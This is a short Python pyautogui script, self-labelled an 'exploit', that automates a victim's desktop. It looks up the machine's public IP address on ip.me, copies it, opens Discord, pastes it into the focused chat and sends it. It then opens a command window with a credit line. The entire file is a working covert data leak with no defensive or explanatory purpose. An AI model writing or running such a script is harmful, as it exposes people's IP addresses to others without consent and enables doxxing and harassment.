import pyautogui as py
import time

py.press('win')
py.write('google')
py.press('enter')
time.sleep(0.5)

py.write('https://ip.me/')
py.press('enter')

time.sleep(1)

py.hotkey('ctrl', 'a')
py.hotkey('ctrl', 'c')

py.press('win')
py.write('Discord')
py.press('enter')

time.sleep(.5)

py.hotkey('ctrl', 'v')
py.press('enter')

py.press('win')
py.write('cmd')
py.press('enter')

time.sleep(1)

py.write('color a')
py.press('enter')
py.write('Exploit made by trulyNathan2 on GitHub')




